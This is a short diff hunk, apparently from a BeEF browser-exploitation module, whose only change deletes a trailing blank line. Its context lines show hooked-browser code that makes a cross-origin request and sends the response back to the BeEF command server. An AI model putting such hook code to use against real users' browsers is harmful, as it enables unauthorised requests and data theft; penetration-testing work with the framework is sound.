@@ -13,4 +13,3 @@ beef.execute(function() {
 	beef.net.cors.request(method, url, data, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "response="+JSON.stringify(response)); });
 
 });
-
